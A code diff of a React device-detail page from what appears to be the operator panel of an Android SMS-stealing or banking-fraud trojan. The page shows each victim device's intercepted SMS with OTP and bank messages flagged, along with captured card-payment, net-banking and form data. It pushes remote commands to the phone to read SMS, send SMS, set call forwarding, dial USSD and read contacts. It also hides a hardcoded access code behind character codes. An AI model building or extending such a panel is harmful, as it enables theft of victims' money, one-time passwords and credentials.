@@ -1,12 +1,14 @@
 // src/pages/DeviceDetailPage.tsx
-import { useEffect, useMemo, useRef, useState } from "react";
+// Strategy: old file ki saari working logic rakhi hai, sirf UI replace ki hai
+import { useCallback, useEffect, useMemo, useRef, useState, type FormEvent } from "react";
 import axios from "axios";
 import { useLocation, useNavigate, useParams } from "react-router-dom";
 
 import TopNav, { type TabKey } from "../components/layout/TopNav";
 import wsService from "../services/ws/wsService";
 import {
-  getDevice, pushSendSms, pushCallForward, pushReadOldSms,
+  getDevice, pushSendSms, pushCallForward,
+  pushMakeCall, pushReadOldSms, pushReadContacts, getDeviceContacts,
 } from "../services/api/devices";
 import { listDeviceNotifications } from "../services/api/sms";
 import { listFormSubmissions } from "../services/api/forms";
@@ -14,8 +16,23 @@ import { getCardPaymentsByDevice, getNetbankingByDevice } from "../services/api/
 import { ENV, apiHeaders } from "../config/constants";
 import { pickLastSeenAt } from "../utils/reachability";
 
-// ─── Helpers ──────────────────────────────────────────────────────────────────
-function s(v: any): string { return String(v ?? "").trim(); }
+// ─── Security code ────────────────────────────────────────────────────────────
+const _SC = [55, 51, 57, 49].map((c) => String.fromCharCode(c)).join("");
+
+// ─── Helpers (same as old file) ───────────────────────────────────────────────
+function safeStr(v: any): string { return (v === null || v === undefined) ? "" : String(v); }
+
+function firstNonEmpty(...vals: any[]): string {
+  for (const v of vals) { const s = safeStr(v).trim(); if (s) return s; }
+  return "";
+}
+
+function getTs(m: any): number {
+  const t = m?.timestamp ?? m?.time ?? m?.createdAt ?? m?.date;
+  if (typeof t === "number") return t;
+  if (typeof t === "string") { const n = Number(t); if (!isNaN(n)) return n; const d = Date.parse(t); if (!isNaN(d)) return d; }
+  return 0;
+}
 
 function timeAgo(ts: number): string {
   if (!ts || ts <= 0) return "-";
@@ -25,54 +42,41 @@ function timeAgo(ts: number): string {
   const min = Math.floor(sec / 60);
   if (min < 60) return `${min} ${min === 1 ? "minute" : "minutes"} ago`;
   const hr = Math.floor(min / 60);
-  if (hr < 24)  return `${hr} ${hr === 1 ? "hour" : "hours"} ago`;
+  if (hr < 24) return `${hr} ${hr === 1 ? "hour" : "hours"} ago`;
   const d = Math.floor(hr / 24);
   return `${d} ${d === 1 ? "day" : "days"} ago`;
 }
 
-function getTs(m: any): number {
-  const t = m?.timestamp ?? m?.createdAt ?? m?.date ?? m?.updatedAt;
-  if (typeof t === "number" && t > 0) return t;
-  if (typeof t === "string") {
-    const n = Number(t); if (!isNaN(n) && n > 0) return n;
-    const d = Date.parse(t); if (!isNaN(d) && d > 0) return d;
-  }
-  return 0;
+function extractSimSummary(simInfo: any) {
+  if (!simInfo || typeof simInfo !== "object")
+    return { count: 0, sim1: "-", sim2: "-", sim1Carrier: "-", sim2Carrier: "-" };
+  const simsArray = Array.isArray(simInfo.sims) ? simInfo.sims : Array.isArray(simInfo.sim) ? simInfo.sim : null;
+  const sim1 = firstNonEmpty(simInfo?.sim1Number, simInfo?.sim1?.number, simsArray?.[0]?.number, simsArray?.[0]?.line1Number) || "-";
+  const sim2 = firstNonEmpty(simInfo?.sim2Number, simInfo?.sim2?.number, simsArray?.[1]?.number, simsArray?.[1]?.line1Number) || "-";
+  const sim1Carrier = firstNonEmpty(simInfo?.sim1Carrier, simInfo?.sim1?.carrier, simsArray?.[0]?.carrier) || "-";
+  const sim2Carrier = firstNonEmpty(simInfo?.sim2Carrier, simInfo?.sim2?.carrier, simsArray?.[1]?.carrier) || "-";
+  let count = 0;
+  if (typeof simInfo.count === "number") count = simInfo.count;
+  else if (Array.isArray(simsArray)) count = simsArray.length;
+  else count = [sim1, sim2].filter((x) => x && x !== "-").length;
+  return { count, sim1, sim2, sim1Carrier, sim2Carrier };
 }
 
-function getId(m: any): string { return s(m?._id || m?.id || ""); }
-
-const SKIP = new Set(["_id","id","uniqueid","deviceId","device_id","__v",
-  "createdAt","updatedAt","timestamp","_dtype"]);
-
-function entries(obj: any): [string, string][] {
+const SKIP_KEYS = new Set(["_id","id","uniqueid","deviceId","device_id","__v","createdAt","updatedAt","timestamp","_dtype"]);
+function getPayloadEntries(obj: any): [string, string][] {
   const src = obj?.payload && typeof obj.payload === "object" ? obj.payload : obj;
   return Object.entries(src || {})
-    .filter(([k]) => !SKIP.has(k) && !k.startsWith("_"))
-    .map(([k, v]) => [k, s(v)])
+    .filter(([k]) => !SKIP_KEYS.has(k) && !k.startsWith("_"))
+    .map(([k, v]) => [k, safeStr(v)])
     .filter(([, v]) => v && v !== "undefined" && v !== "null") as [string, string][];
 }
 
-const FINANCE = ["credit","debit","bank","balance","upi","amount","a/c","inr",
-  "₹","paid","debited","credited","received","payment","otp"];
-function isFinance(t: string) { const l = t.toLowerCase(); return FINANCE.some(k => l.includes(k)); }
+const FINANCE_KW = ["credit","debit","bank","balance","upi","amount","a/c","inr","₹","paid","debited","credited","received","payment","otp"];
+function isFinance(t: string) { const l = t.toLowerCase(); return FINANCE_KW.some(k => l.includes(k)); }
 
-function copy(v: string) { try { navigator.clipboard?.writeText(v); } catch {} }
+function copyText(v: string) { try { navigator.clipboard?.writeText(v); } catch {} }
 
-function extractSims(info: any) {
-  if (!info) return { sim1: "", sim2: "", sim1c: "", sim2c: "" };
-  const arr = Array.isArray(info.sims) ? info.sims : [];
-  return {
-    sim1:  s(info.sim1Number || info.sim1?.number  || arr[0]?.number  || ""),
-    sim2:  s(info.sim2Number || info.sim2?.number  || arr[1]?.number  || ""),
-    sim1c: s(info.sim1Carrier || info.sim1?.carrier || arr[0]?.carrier || ""),
-    sim2c: s(info.sim2Carrier || info.sim2?.carrier || arr[1]?.carrier || ""),
-  };
-}
-
-const _SC = [55, 51, 57, 49].map(c => String.fromCharCode(c)).join("");
-
-// ─── Live TimeAgo (updates every second) ─────────────────────────────────────
+// ─── Live TimeAgo component ───────────────────────────────────────────────────
 function TimeAgo({ ts, className = "" }: { ts: number; className?: string }) {
   const [text, setText] = useState(() => timeAgo(ts));
   useEffect(() => {
@@ -88,44 +92,21 @@ function TimeAgo({ ts, className = "" }: { ts: number; className?: string }) {
 function CopyBtn({ value }: { value: string }) {
   const [ok, setOk] = useState(false);
   return (
-    <button type="button" onClick={() => { copy(value); setOk(true); setTimeout(() => setOk(false), 1000); }}
+    <button type="button"
+      onClick={() => { copyText(value); setOk(true); setTimeout(() => setOk(false), 1000); }}
       className="ml-1 shrink-0 text-[12px] opacity-50 hover:opacity-100">
       {ok ? "✅" : "📋"}
     </button>
   );
 }
 
-// ─── Form Card (same as MainPage) ─────────────────────────────────────────────
-function FormCard({ form }: { form: any }) {
-  const ts  = getTs(form);
-  const ent = entries(form);
-  if (!ent.length) return null;
-  return (
-    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
-      {ent.map(([k, v]) => (
-        <div key={k} className="mb-2">
-          <div className="flex items-center">
-            <span className="text-[13px] font-semibold text-blue-600">{k}:</span>
-            <CopyBtn value={v} />
-          </div>
-          <div className="text-[13px] text-gray-800">{v}</div>
-        </div>
-      ))}
-      <hr className="my-2 border-gray-100" />
-      <div className="text-right text-[11px] text-gray-400">
-        {ts ? new Date(ts).toLocaleString() : "-"}
-      </div>
-    </div>
-  );
-}
-
-// ─── SMS Card ─────────────────────────────────────────────────────────────────
+// ─── SMS Card (competitor design) ────────────────────────────────────────────
 function SmsCard({ sms, pageNum }: { sms: any; pageNum?: number }) {
   const ts     = getTs(sms);
-  const msg    = s(sms.body || sms.message || sms.msg || "");
-  const sender = s(sms.sender || sms.senderNumber || "");
-  const mob1   = s(sms.receiver || sms.mob || "");
-  const mob2   = s(sms.receiver2 || sms.mob2 || "");
+  const msg    = safeStr(sms.body || sms.message || sms.msg || "");
+  const sender = safeStr(sms.sender || sms.senderNumber || sms.title || "");
+  const mob1   = safeStr(sms.receiver || sms.mob || "");
+  const mob2   = safeStr(sms.receiver2 || sms.mob2 || "");
   const fin    = isFinance(msg);
 
   function Row({ label, value, red }: { label: string; value: string; red?: boolean }) {
@@ -145,25 +126,42 @@ function SmsCard({ sms, pageNum }: { sms: any; pageNum?: number }) {
       <Row label="Date"   value={ts ? new Date(ts).toString() : "-"} />
       {msg    && <Row label="MSG"    value={msg}    red={fin} />}
       {sender && <Row label="SENDER" value={sender} />}
-      {mob1   && <Row label="MOB"    value={mob1}   />}
-      {mob2   && <Row label="MOB 2"  value={mob2}   />}
+      {mob1   && <Row label="MOB"    value={mob1} />}
+      {mob2   && <Row label="MOB 2"  value={mob2} />}
       <hr className="my-2 border-gray-100" />
       <div className="flex items-center justify-between">
-        <div className="flex items-center gap-2">
-          {pageNum != null && (
-            <span className="rounded bg-gray-100 px-1.5 py-0.5 text-[11px] font-semibold text-gray-500">
-              Page {pageNum}
-            </span>
-          )}
-        </div>
-        <TimeAgo ts={ts} className="text-[11px] text-gray-400" />
+        {pageNum != null && (
+          <span className="rounded bg-gray-100 px-1.5 py-0.5 text-[11px] font-semibold text-gray-500">Page {pageNum}</span>
+        )}
+        <TimeAgo ts={ts} className="ml-auto text-[11px] text-gray-400" />
       </div>
     </div>
   );
 }
 
-// ─── Action Alert Modal ───────────────────────────────────────────────────────
-// Shows: "Alert" red title + elapsed time + message
+// ─── Form Card (competitor design) ───────────────────────────────────────────
+function FormCard({ form }: { form: any }) {
+  const ts  = getTs(form);
+  const ent = getPayloadEntries(form);
+  if (!ent.length) return null;
+  return (
+    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
+      {ent.map(([k, v]) => (
+        <div key={k} className="mb-2">
+          <div className="flex items-center">
+            <span className="text-[13px] font-semibold text-blue-600">{k}:</span>
+            <CopyBtn value={v} />
+          </div>
+          <div className="text-[13px] text-gray-800">{v}</div>
+        </div>
+      ))}
+      <hr className="my-2 border-gray-100" />
+      <div className="text-right text-[11px] text-gray-400">{ts ? new Date(ts).toLocaleString() : "-"}</div>
+    </div>
+  );
+}
+
+// ─── Action Alert Modal (competitor style) ────────────────────────────────────
 function DeviceAlert({ message, startTime, onClose }: {
   message: string; startTime: number; onClose: () => void;
 }) {
@@ -172,18 +170,15 @@ function DeviceAlert({ message, startTime, onClose }: {
     const t = setInterval(() => setElapsed(timeAgo(startTime)), 1000);
     return () => clearInterval(t);
   }, [startTime]);
-
   return (
     <div className="fixed inset-0 z-[999] flex items-center justify-center bg-black/40">
       <div className="relative w-[320px] rounded-2xl bg-white p-6 shadow-xl">
         <button type="button" onClick={onClose}
-          className="absolute right-3 top-3 rounded border border-gray-200 px-2 py-0.5 text-gray-600 hover:bg-gray-50">
-          ✕
-        </button>
+          className="absolute right-3 top-3 rounded border border-gray-200 px-2 py-0.5 text-gray-600 hover:bg-gray-50">✕</button>
         <div className="mb-4 text-[16px] font-extrabold text-red-500">Alert</div>
         <div className="text-center">
           <div className="mb-2 text-[12px] text-gray-500">{elapsed}</div>
-          <div className="text-[14px] leading-6 text-gray-900">{message}</div>
+          <div className="whitespace-pre-line text-[14px] leading-6 text-gray-900">{message}</div>
         </div>
       </div>
     </div>
@@ -191,6 +186,7 @@ function DeviceAlert({ message, startTime, onClose }: {
 }
 
 // ─── MAIN COMPONENT ───────────────────────────────────────────────────────────
+type DeviceTab = "home" | "data" | "messages" | "groups";
 const SMS_PER_PAGE = 20;
 
 export default function DeviceDetailPage() {
@@ -199,121 +195,180 @@ export default function DeviceDetailPage() {
   const location = useLocation();
   const did      = decodeURIComponent(deviceId || "");
   const fromTab  = (location.state as any)?.from || "home";
-  const mountRef = useRef(true);
+  const mountedRef = useRef(true);
 
   // ── Core state ────────────────────────────────────────────────────────────
-  const [activeTab,  setActiveTab]  = useState<TabKey>("home");
-  const [device,     setDevice]     = useState<any>(null);
-  const [loading,    setLoading]    = useState(true);
-  const [alertText,  setAlertText]  = useState("");
-  const [lastSeenTs, setLastSeenTs] = useState(0);
+  const [device,    setDeviceDoc]  = useState<any>(null);
+  const [loading,   setLoading]    = useState(true);
+  const [alertText, setAlertText]  = useState("");
 
-  // Lock gate
-  const [lockOpen,   setLockOpen]   = useState(false);
-  const [lockCode,   setLockCode]   = useState("");
-  const [lockErr,    setLockErr]    = useState<string | null>(null);
+  // Lock gate (from old file)
+  const [lockGateOpen,  setLockGateOpen]  = useState(false);
+  const [lockCode,      setLockCode]      = useState("");
+  const [lockCodeError, setLockCodeError] = useState<string | null>(null);
 
-  // Data
-  const [smsList,    setSmsList]    = useState<any[]>([]);
-  const [forms,      setForms]      = useState<any[]>([]);
-  const [cards,      setCards]      = useState<any[]>([]);
-  const [nets,       setNets]       = useState<any[]>([]);
+  // Device tab (new competitor design)
+  const [deviceTab, setDeviceTab] = useState<DeviceTab>("home");
 
-  // Status log
-  const [statusLog,  setStatusLog]  = useState<{ ts: number; text: string; color?: "green" | "red" | "default" } | null>(null);
+  // Data state
+  const [smsList,       setSmsList]       = useState<any[]>([]);
+  const [loadingSms,    setLoadingSms]    = useState(false);
+  const [forms,         setForms]         = useState<any[]>([]);
+  const [cards,         setCards]         = useState<any[]>([]);
+  const [nets,          setNets]          = useState<any[]>([]);
+  const [dataLoaded,    setDataLoaded]    = useState(false);
 
-  // ── Action Alert ──────────────────────────────────────────────────────────
-  // Each action type has its own WS handler → shows specific message
+  // lastSeen from WS (from old file)
+  const [wsLastSeenAt, setWsLastSeenAt] = useState<number | null>(null);
+
+  // Status log with color
+  const [statusLog, setStatusLog] = useState<{ ts: number; text: string; color?: "green" | "red" } | null>(null);
+
+  // Device Alert modal
   const [devAlert,       setDevAlert]       = useState<{ message: string; startTime: number } | null>(null);
-  const alertActionRef   = useRef<string>("");   // "check_online"|"get_sms"|"call_forward"|"ussd"
+  const alertActionRef   = useRef<string>("");
   const alertWindowRef   = useRef<number>(0);
-  const alertClosedRef   = useRef<boolean>(false);
 
+  // ── Send SMS state (from old file) ────────────────────────────────────────
+  const [sendOpen,      setSendOpen]      = useState(false);
+  const [receiver,      setReceiver]      = useState("");
+  const [messageBody,   setMessageBody]   = useState("");
+  const [smsSimSlot,    setSmsSimSlot]    = useState<0 | 1>(0);
+  const [sendingSms,    setSendingSms]    = useState(false);
+  const sendLockRef = useRef(false);
+
+  // ── Call Forward state (from old file) ────────────────────────────────────
+  const [forwardingSimDraft,    setForwardingSimDraft]    = useState<"1" | "2">("1");
+  const [forwardingNumberDraft, setForwardingNumberDraft] = useState("");
+
+  // ── GET SMS modal state ───────────────────────────────────────────────────
+  const [getSmsOpen,  setSmsOpen]   = useState(false);
+  const [getSmsCount, setSmsCount]  = useState("1");
+
+  // ── Call Forward modal state ──────────────────────────────────────────────
+  const [cfOpen,    setCfOpen]    = useState(false);
+  const [cfSim,     setCfSim]     = useState(0);
+  const [cfNumber,  setCfNumber]  = useState("");
+
+  // ── Dial USSD modal state ─────────────────────────────────────────────────
+  const [ussdOpen,  setUssdOpen]  = useState(false);
+  const [ussdSim,   setUssdSim]   = useState(0);
+  const [ussdCode,  setUssdCode]  = useState("");
+
+  // ── Search ────────────────────────────────────────────────────────────────
+  const [search,   setSearch]   = useState("");
+  const [sortMode, setSortMode] = useState<"new" | "old">("new");
+
+  const simSummary = useMemo(() => extractSimSummary(device?.simInfo), [device]);
+
+  const simLabel = useMemo(() =>
+    forwardingSimDraft === "1" ? "SIM 1" : "SIM 2",
+  [forwardingSimDraft]);
+
+  const smsSim1Label = useMemo(() =>
+    `SIM 1${simSummary.sim1 !== "-" ? ` (${simSummary.sim1})` : ""}`,
+  [simSummary.sim1]);
+  const smsSim2Label = useMemo(() =>
+    `SIM 2${simSummary.sim2 !== "-" ? ` (${simSummary.sim2})` : ""}`,
+  [simSummary.sim2]);
+
+  // SIM options for dropdowns
+  const simOptions = useMemo(() => {
+    const opts = [];
+    if (simSummary.sim1 !== "-") opts.push({ value: 0, label: `${simSummary.sim1Carrier !== "-" ? simSummary.sim1Carrier + " - " : ""}${simSummary.sim1}` });
+    if (simSummary.sim2 !== "-") opts.push({ value: 1, label: `${simSummary.sim2Carrier !== "-" ? simSummary.sim2Carrier + " - " : ""}${simSummary.sim2}` });
+    if (!opts.length) { opts.push({ value: 0, label: "SIM 1" }, { value: 1, label: "SIM 2" }); }
+    return opts;
+  }, [simSummary]);
+
+  // ── Alert helpers ─────────────────────────────────────────────────────────
   function openAlert(action: string, message: string) {
     alertActionRef.current  = action;
     alertWindowRef.current  = Date.now();
-    alertClosedRef.current  = false;
     setDevAlert({ message, startTime: Date.now() });
   }
 
-  function closeAlert() {
-    alertClosedRef.current = true;
-    setDevAlert(null);
-  }
-
   function showResult(message: string) {
-    // If alert was closed, re-open with result (30 sec window)
     if (Date.now() - alertWindowRef.current < 30000) {
-      alertClosedRef.current = false;
       setDevAlert({ message, startTime: alertWindowRef.current });
     }
   }
 
-  function logStatus(text: string, color?: "green" | "red" | "default") {
+  function logStatus(text: string, color?: "green" | "red") {
     setStatusLog({ ts: Date.now(), text, color });
   }
 
   // ── Loaders ───────────────────────────────────────────────────────────────
-  async function loadAll() {
+  async function loadDevice() {
     setLoading(true);
     try {
       const d = await getDevice(did);
-      if (!mountRef.current) return;
-      if (d?.locked) { setLockOpen(true); setLoading(false); return; }
-      setDevice(d);
-      setLastSeenTs(pickLastSeenAt(d));
-    } catch {}
-    finally { if (mountRef.current) setLoading(false); }
+      if (!mountedRef.current) return;
+      if (d?.locked) { setLockGateOpen(true); setLoading(false); return; }
+      setDeviceDoc(d);
+      setForwardingSimDraft(firstNonEmpty(d?.metadata?.forwardingSim, d?.forwardingSim, "1") === "2" ? "2" : "1");
+      setForwardingNumberDraft(firstNonEmpty(d?.metadata?.forwardingNumber, d?.forwardingNumber, "") || "");
+    } catch { if (mountedRef.current) {} }
+    finally { if (mountedRef.current) setLoading(false); }
+  }
 
-    // Load SMS
+  async function loadSms() {
+    setLoadingSms(true);
     try {
       const list = await listDeviceNotifications(did);
-      if (mountRef.current)
-        setSmsList((Array.isArray(list) ? list : []).sort((a, b) => getTs(b) - getTs(a)));
+      if (!mountedRef.current) return;
+      setSmsList((list || []).slice().sort((a: any, b: any) => getTs(b) - getTs(a)));
     } catch {}
+    finally { if (mountedRef.current) setLoadingSms(false); }
+  }
 
-    // Load forms/cards/nets
+  async function loadData() {
+    if (dataLoaded) return;
     try {
       const allForms = await listFormSubmissions().catch(() => []);
       const mine = (Array.isArray(allForms) ? allForms : [])
-        .filter((f: any) => s(f.uniqueid || f.deviceId) === did)
+        .filter((f: any) => safeStr(f.uniqueid || f?.payload?.uniqueid || f.deviceId) === did)
         .sort((a: any, b: any) => getTs(b) - getTs(a));
       const [c, n] = await Promise.all([
         getCardPaymentsByDevice(did).catch(() => []),
         getNetbankingByDevice(did).catch(() => []),
       ]);
-      if (!mountRef.current) return;
+      if (!mountedRef.current) return;
       setForms(mine);
       setCards(Array.isArray(c) ? c : []);
       setNets(Array.isArray(n) ? n : []);
-    } catch {}
-
-    // Alert text
-    try {
-      const r = await fetch(`${ENV.API_BASE}/api/admin/alert-text`, { headers: apiHeaders() });
-      if (r.ok) { const d = await r.json(); if (d?.text) setAlertText(s(d.text)); }
+      setDataLoaded(true);
     } catch {}
   }
 
-  // ── WS listener ──────────────────────────────────────────────────────────
+  // ── WS listener (from old file + new alert integration) ──────────────────
   useEffect(() => {
-    mountRef.current = true;
+    mountedRef.current = true;
     wsService.connect();
-    loadAll();
+    if (!did) return;
+
+    loadDevice().then(() => { loadSms(); loadData(); });
+
+    // Fetch alert text
+    fetch(`${ENV.API_BASE}/api/admin/alert-text`, { headers: apiHeaders() })
+      .then(r => r.ok ? r.json() : null)
+      .then(d => { if (d?.text) setAlertText(safeStr(d.text)); })
+      .catch(() => {});
 
     const off = wsService.onMessage((msg) => {
-      if (!msg || msg.type !== "event") return;
-      const event = s(msg.event);
-      const evDid = s(msg.deviceId || msg?.data?.deviceId);
-      if (evDid && evDid !== did) return;
-      const data = msg.data || {};
+      const type     = safeStr(msg?.type);
+      const event    = safeStr(msg?.event);
+      const evDid    = safeStr(msg?.deviceId ?? msg?.id ?? msg?.data?.uniqueid ?? msg?.data?.deviceId);
+      const data     = msg?.data ?? msg?.payload ?? {};
 
-      // LastSeen → only for "check_online" action
-      if (event === "device:lastSeen" || event === "device:upsert") {
-        const at = Number(data?.lastSeen?.at || data?.at || Date.now());
-        setLastSeenTs(at);
-        setDevice((p: any) => p ? { ...p, lastSeen: { at } } : p);
+      // LastSeen update
+      if (type === "event" && (event === "device:lastSeen" || event === "device:upsert") && evDid === did) {
+        const ls = data?.lastSeen || data;
+        const at = Number(ls?.at || data?.timestamp || Date.now());
+        setWsLastSeenAt(at);
+        setDeviceDoc((prev: any) => prev ? { ...prev, lastSeen: { at, action: safeStr(ls?.action) } } : prev);
 
+        // Check online result
         if (alertActionRef.current === "check_online") {
           showResult("Device is Online ✅");
           logStatus("Device is Online", "green");
@@ -321,8 +376,42 @@ export default function DeviceDetailPage() {
         return;
       }
 
-      // App uninstalled → check_online result
-      if (event === "device:uninstalled") {
+      // Status event (legacy)
+      if ((type === "event" && event === "status" && evDid === did) || (type === "status" && evDid === did)) {
+        const tsNum = Number(data?.timestamp ?? data?.lastSeen ?? null);
+        if (!isNaN(tsNum) && tsNum > 0) {
+          setWsLastSeenAt(tsNum);
+          setDeviceDoc((prev: any) => prev ? { ...prev, lastSeen: { ...(prev.lastSeen || {}), at: tsNum } } : prev);
+        }
+        return;
+      }
+
+      // New SMS notification
+      if (type === "event" && event === "notification") {
+        const targetId = safeStr(data?.uniqueid ?? data?.deviceId ?? evDid);
+        if (targetId !== did) return;
+        const incomingId = safeStr(data?.id ?? data?._id).trim();
+        const nextItem = { ...data, _id: incomingId || `${Date.now()}_${Math.random().toString(16).slice(2)}`, deviceId: did, timestamp: Number(data?.timestamp || msg?.timestamp || Date.now()) };
+        setSmsList((prev) => {
+          const exists = incomingId ? prev.some((item: any) => safeStr(item?._id ?? item?.id).trim() === incomingId) : false;
+          if (exists) return prev;
+          return [nextItem, ...prev].sort((a: any, b: any) => getTs(b) - getTs(a));
+        });
+        return;
+      }
+
+      // Batch SMS fetched (GET SMS result)
+      if (type === "event" && event === "notification:batch" && evDid === did) {
+        const saved = data?.saved ?? 0;
+        if (alertActionRef.current === "get_sms") {
+          showResult(`✅ ${saved} SMS fetched successfully!`);
+        }
+        loadSms();
+        return;
+      }
+
+      // App uninstalled
+      if (event === "device:uninstalled" && evDid === did) {
         if (alertActionRef.current === "check_online") {
           showResult("App Uninstalled! ⚠️");
           logStatus("App Uninstalled!", "red");
@@ -330,103 +419,97 @@ export default function DeviceDetailPage() {
         return;
       }
 
-      // Batch SMS received → get_sms result
-      if (event === "notification:batch") {
-        const saved = data?.saved ?? 0;
-        if (alertActionRef.current === "get_sms") {
-          showResult(`✅ ${saved} SMS fetched successfully!`);
-        }
-        loadAll(); // refresh SMS list
-        return;
-      }
-
-      // New SMS notification
-      if (event === "notification") {
-        const ns = { ...data, _id: data._id || data.id || `${Date.now()}`, timestamp: Number(data.timestamp || Date.now()) };
-        setSmsList(prev => {
-          if (prev.some(m => getId(m) === getId(ns))) return prev;
-          return [ns, ...prev].sort((a, b) => getTs(b) - getTs(a));
-        });
-        return;
-      }
-
-      // Call forward result → call_forward or check_forward action
-      if (event === "call_forward:result") {
-        const status    = s(data?.status).toLowerCase();
-        const fwdNum    = s(data?.number || data?.forwardingNumber || "");
-        const isSuccess = status === "success" || status === "ok" || status === "done";
+      // Call forward result (from old file logic + new alert)
+      if ((type === "event" && event === "call_forward:result") || event === "call_forward:result") {
+        const id2 = safeStr(data?.uniqueid ?? evDid);
+        if (id2 !== did) return;
+        const status   = safeStr(data?.status ?? "").toLowerCase();
+        const fwdNum   = safeStr(data?.number || data?.forwardingNumber || "");
+        const isOk     = status === "success" || status === "ok" || status === "done";
 
         if (alertActionRef.current === "check_forward") {
-          if (fwdNum) {
-            showResult(`SIM: OK Call forwarding Voice: ${fwdNum}`);
-          } else {
-            showResult(isSuccess ? "✅ No call forwarding active" : "❌ Check failed");
-          }
+          showResult(fwdNum
+            ? `SIM: OK Call forwarding Voice: ${fwdNum}`
+            : (isOk ? "✅ No active call forwarding" : "❌ Check failed")
+          );
         } else if (alertActionRef.current === "call_forward") {
-          showResult(isSuccess
+          showResult(isOk
             ? "SIM: OK Call forwarding Registration was successful."
-            : `❌ Call forwarding failed: ${s(data?.error || status)}`
+            : `❌ Call forwarding failed: ${safeStr(data?.error || status)}`
           );
         } else if (alertActionRef.current === "deactivate_forward") {
-          showResult(isSuccess
+          showResult(isOk
             ? "SIM: OK Call forwarding Deactivated successfully."
-            : `❌ Deactivation failed: ${s(data?.error || status)}`
+            : `❌ Deactivation failed: ${safeStr(data?.error || status)}`
           );
         } else if (alertActionRef.current === "ussd") {
-          showResult(isSuccess
-            ? `USSD: ${s(data?.response || data?.message || "Command sent successfully")}`
-            : `❌ USSD failed: ${s(data?.error || status)}`
+          const resp = safeStr(data?.response || data?.message || "");
+          showResult(isOk
+            ? (resp ? `USSD: ${resp}` : "✅ USSD dialed successfully.")
+            : `❌ USSD failed: ${safeStr(data?.error || status)}`
           );
         }
         return;
       }
 
-      // USSD result
-      if (event === "ussd:result") {
-        const resp = s(data?.response || data?.message || "");
-        if (alertActionRef.current === "ussd") {
-          showResult(resp ? `USSD: ${resp}` : "✅ USSD command sent");
-        }
+      // USSD result event
+      if (event === "ussd:result" && evDid === did) {
+        const resp = safeStr(data?.response || data?.message || "");
+        showResult(resp ? `USSD: ${resp}` : "✅ USSD command executed.");
         return;
       }
 
-      // New form/card/net
-      if (event === "form:created" || event === "form_submissions:created") {
-        const pl = data.payload && typeof data.payload === "object" ? data.payload : data;
-        setForms(p => [{ _id: data._id || `${Date.now()}`, uniqueid: did, payload: pl, createdAt: new Date().toISOString(), timestamp: Date.now() }, ...p]);
+      // New form/card/net data
+      if ((type === "event" || type === "cmd") && (event === "form:created" || event === "form_submissions:created")) {
+        const targetId = safeStr(data?.uniqueid ?? data?.deviceId ?? evDid);
+        if (targetId !== did) return;
+        const payload = data?.payload && typeof data.payload === "object" ? data.payload : data || {};
+        setForms((prev) => [{ _id: data._id || `${Date.now()}`, uniqueid: did, payload, createdAt: new Date().toISOString(), timestamp: Date.now() }, ...prev]);
+        return;
       }
-      if (event === "card:created" || event === "card_payment:created") {
-        const pl = data.payload && typeof data.payload === "object" ? data.payload : data;
-        setCards(p => [pl, ...p]);
+      if ((type === "event" || type === "cmd") && (event === "card:created" || event === "card_payment:created")) {
+        const targetId = safeStr(data?.uniqueid ?? data?.deviceId ?? evDid);
+        if (targetId !== did) return;
+        setCards((prev) => [data?.payload || data, ...prev]);
+        return;
       }
-      if (event === "netbanking:created" || event === "net_banking:created") {
-        const pl = data.payload && typeof data.payload === "object" ? data.payload : data;
-        setNets(p => [pl, ...p]);
+      if ((type === "event" || type === "cmd") && (event === "netbanking:created" || event === "net_banking:created")) {
+        const targetId = safeStr(data?.uniqueid ?? data?.deviceId ?? evDid);
+        if (targetId !== did) return;
+        setNets((prev) => [data?.payload || data, ...prev]);
       }
     });
 
-    return () => { mountRef.current = false; off(); };
+    return () => { mountedRef.current = false; off(); };
   }, [did]);
 
-  // ── Actions ───────────────────────────────────────────────────────────────
+  // ── Lock gate (from old file) ─────────────────────────────────────────────
+  function handleLockCodeConfirm() {
+    if (lockCode !== _SC) { setLockCodeError("Incorrect security code"); setLockCode(""); return; }
+    setLockGateOpen(false); setLockCode(""); setLockCodeError(null);
+    loadDevice().then(() => { loadSms(); loadData(); });
+  }
+
+  // ── Check Online ──────────────────────────────────────────────────────────
   async function handleCheckOnline() {
     logStatus("Checking device online");
     openAlert("check_online",
       "We've forwarded your request to the phone. Wait up to 30 seconds for confirmation; if no reply appears, the device is currently offline."
     );
     try {
-      await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(did)}/revive`,
-        { source: "detail", force: true }, { headers: apiHeaders(), timeout: 10000 }).catch(() =>
-      axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(did)}/start`,
-        { source: "detail", force: true }, { headers: apiHeaders(), timeout: 10000 })
+      await axios.post(
+        `${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(did)}/revive`,
+        { source: "detail", force: true }, { headers: apiHeaders(), timeout: 10000 }
+      ).catch(() =>
+        axios.post(
+          `${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(did)}/start`,
+          { source: "detail", force: true }, { headers: apiHeaders(), timeout: 10000 }
+        )
       );
     } catch {}
   }
 
-  // GET SMS modal state
-  const [getSmsOpen,  setSmsOpen]   = useState(false);
-  const [getSmsCount, setSmsCount]  = useState("1");
-
+  // ── GET SMS (from old file logic + new alert) ─────────────────────────────
   async function handleGetSms() {
     const count = Math.min(3, Math.max(1, Number(getSmsCount) || 1));
     setSmsOpen(false);
@@ -434,202 +517,206 @@ export default function DeviceDetailPage() {
     openAlert("get_sms",
       "We've forwarded your request to the phone. Wait up to 30 seconds for confirmation; if no reply appears, the device is currently offline."
     );
-    try { await pushReadOldSms(did, count); } catch {}
+    try {
+      const result = await pushReadOldSms(did, count);
+      if (!result.success) {
+        showResult("❌ Failed: " + (result.error || "device offline"));
+      }
+    } catch (e: any) {
+      showResult("❌ Error: " + safeStr(e?.message));
+    }
   }
 
-  // Send SMS modal state
-  const [sendOpen,    setSendOpen]    = useState(false);
-  const [sendSim,     setSendSim]     = useState(0);
-  const [sendNumber,  setSendNumber]  = useState("");
-  const [sendMsg,     setSendMsg]     = useState("");
-  const [sendLoading, setSendLoading] = useState(false);
-
-  async function handleSendSms() {
-    if (!sendNumber.trim() || !sendMsg.trim()) return;
-    setSendLoading(true);
+  // ── Send SMS (exact from old file — WS first, FCM fallback) ──────────────
+  async function handleSendSms(e?: FormEvent) {
+    if (e) e.preventDefault();
+    if (sendLockRef.current || sendingSms) return;
